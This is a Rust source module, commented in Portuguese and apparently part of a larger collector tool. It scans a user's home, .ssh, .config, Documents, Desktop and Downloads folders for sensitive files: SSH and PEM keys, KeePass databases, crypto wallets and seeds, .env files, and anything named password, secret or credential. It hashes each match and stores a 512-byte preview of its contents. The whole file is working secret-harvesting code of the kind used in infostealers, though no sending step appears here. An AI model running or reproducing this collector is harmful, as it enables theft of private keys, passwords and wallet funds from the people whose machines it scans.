//! Coletor de Arquivos Sensíveis
//!
//! Busca arquivos potencialmente sensíveis no sistema.

use std::path::PathBuf;
use serde::{Deserialize, Serialize};
use walkdir::WalkDir;
use regex::Regex;
use sha2::{Sha256, Digest};

use super::{Collector, CollectorError, ModuleData};

/// Dados de arquivos coletados
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileData {
    /// Diretórios escaneados
    pub scanned_dirs: Vec<String>,
    
    /// Arquivos encontrados
    pub found_files: Vec<FoundFile>,
    
    /// Total de arquivos escaneados
    pub total_scanned: u32,
    
    /// Total de matches
    pub total_matches: u32,
    
    /// Duração do scan em ms
    pub scan_duration_ms: u64,
}

/// Arquivo encontrado
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FoundFile {
    /// Caminho do arquivo
    pub path: String,
    
    /// Nome do arquivo
    pub filename: String,
    
    /// Tamanho em bytes
    pub size_bytes: u64,
    
    /// Última modificação
    pub modified: String,
    
    /// Razão do match
    pub match_reason: String,
    
    /// Hash SHA256 do arquivo
    pub sha256: String,
    
    /// Preview do conteúdo (primeiros 512 bytes)
    pub content_preview: Option<String>,
}

/// Coletor de arquivos
pub struct FileCollector {
    /// Extensões de interesse
    target_extensions: Vec<String>,
    
    /// Padrões de nome
    name_patterns: Vec<Regex>,
    
    /// Tamanho máximo para processar
    max_file_size: u64,
    
    /// Profundidade máxima
    max_depth: usize,
}

impl FileCollector {
    pub fn new() -> Self {
        Self {
            target_extensions: vec![
                "txt", "doc", "docx", "pdf",
                "key", "pem", "ppk", "pub",
                "kdbx", "kdb", // KeePass
                "wallet", "dat", // Crypto
                "json", "env", "cfg", "conf", "ini",
                "sql", "db", "sqlite",
            ].into_iter().map(String::from).collect(),
            
            name_patterns: vec![
                Regex::new(r"(?i)password").unwrap(),
                Regex::new(r"(?i)secret").unwrap(),
                Regex::new(r"(?i)credential").unwrap(),
                Regex::new(r"(?i)private").unwrap(),
                Regex::new(r"(?i)\.env").unwrap(),
                Regex::new(r"(?i)id_rsa").unwrap(),
                Regex::new(r"(?i)id_ed25519").unwrap(),
                Regex::new(r"(?i)wallet").unwrap(),
                Regex::new(r"(?i)backup").unwrap(),
                Regex::new(r"(?i)seed").unwrap(),
            ],
            
            max_file_size: 10 * 1024 * 1024, // 10MB
            max_depth: 5,
        }
    }
    
    /// Executa a busca de arquivos
    fn scan_files(&self) -> Result<FileData, CollectorError> {
        let start = std::time::Instant::now();
        let mut found_files = Vec::new();
        let mut total_scanned = 0u32;
        
        // Diretórios para escanear
        let scan_dirs = self.get_scan_directories();
        let scanned_dirs: Vec<String> = scan_dirs.iter()
            .map(|p| p.to_string_lossy().to_string())
            .collect();
        
        for dir in &scan_dirs {
            if !dir.exists() {
                continue;
            }
            
            tracing::info!("Escaneando: {}", dir.display());
            
            for entry in WalkDir::new(dir)
                .max_depth(self.max_depth)
                .follow_links(false)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                total_scanned += 1;
                
                let path = entry.path();
                
                // Verificar se é arquivo
                if !path.is_file() {
                    continue;
                }
                
                // Verificar tamanho
                if let Ok(metadata) = path.metadata() {
                    if metadata.len() > self.max_file_size {
                        continue;
                    }
                }
                
                // Verificar match
                if let Some(match_reason) = self.check_file_match(path) {
                    if let Ok(found) = self.process_file(path, &match_reason) {
                        found_files.push(found);
                        
                        // Limitar resultados
                        if found_files.len() >= 100 {
                            break;
                        }
                    }
                }
            }
        }
        
        Ok(FileData {
            scanned_dirs,
            total_matches: found_files.len() as u32,
            found_files,
            total_scanned,
            scan_duration_ms: start.elapsed().as_millis() as u64,
        })
    }
    
    /// Retorna diretórios para escanear
    fn get_scan_directories(&self) -> Vec<PathBuf> {
        let mut dirs = Vec::new();
        
        if let Some(home) = dirs::home_dir() {
            dirs.push(home.clone());
            dirs.push(home.join("Documents"));
            dirs.push(home.join("Desktop"));
            dirs.push(home.join("Downloads"));
            dirs.push(home.join(".ssh"));
            dirs.push(home.join(".config"));
        }
        
        dirs
    }
    
    /// Verifica se arquivo corresponde aos critérios
    fn check_file_match(&self, path: &std::path::Path) -> Option<String> {
        let filename = path.file_name()?.to_string_lossy().to_lowercase();
        
        // Verificar extensão
        if let Some(ext) = path.extension() {
            let ext_str = ext.to_string_lossy().to_lowercase();
            if self.target_extensions.contains(&ext_str) {
                return Some(format!("extension: .{}", ext_str));
            }
        }
        
        // Verificar padrões de nome
        for pattern in &self.name_patterns {
            if pattern.is_match(&filename) {
                return Some(format!("pattern: {}", pattern.as_str()));
            }
        }
        
        None
    }
    
    /// Processa um arquivo encontrado
    fn process_file(&self, path: &std::path::Path, match_reason: &str) -> Result<FoundFile, CollectorError> {
        let metadata = path.metadata()?;
        
        // Calcular hash
        let hash = self.calculate_hash(path).unwrap_or_else(|_| "error".to_string());
        
        // Preview do conteúdo (apenas para arquivos de texto pequenos)
        let preview = self.get_preview(path);
        
        let modified = metadata.modified()
            .map(|t| {
                let datetime: chrono::DateTime<chrono::Utc> = t.into();
                datetime.to_rfc3339()
            })
            .unwrap_or_else(|_| "unknown".to_string());
        
        Ok(FoundFile {
            path: path.to_string_lossy().to_string(),
            filename: path.file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default(),
            size_bytes: metadata.len(),
            modified,
            match_reason: match_reason.to_string(),
            sha256: hash,
            content_preview: preview,
        })
    }
    
    /// Calcula hash SHA256
    fn calculate_hash(&self, path: &std::path::Path) -> Result<String, std::io::Error> {
        let content = std::fs::read(path)?;
        let mut hasher = Sha256::new();
        hasher.update(&content);
        Ok(hex::encode(hasher.finalize()))
    }
    
    /// Obtém preview do conteúdo
    fn get_preview(&self, path: &std::path::Path) -> Option<String> {
        // Apenas para arquivos pequenos de texto
        let metadata = path.metadata().ok()?;
        if metadata.len() > 8192 {
            return None;
        }
        
        let content = std::fs::read_to_string(path).ok()?;
        
        // Truncar
        let preview = if content.len() > 512 {
            format!("{}... [truncated]", &content[..512])
        } else {
            content
        };
        
        // Verificar se é texto válido
        if preview.chars().any(|c| c.is_control() && c != '\n' && c != '\r' && c != '\t') {
            return Some("[binary content]".to_string());
        }
        
        Some(preview)
    }
}

impl Default for FileCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for FileCollector {
    fn name(&self) -> &str {
        "files"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.scan_files()?;
        Ok(ModuleData::Files(data))
    }
    
    fn is_supported(&self) -> bool {
        true
    }
    
    fn priority(&self) -> u8 {
        60
    }
}

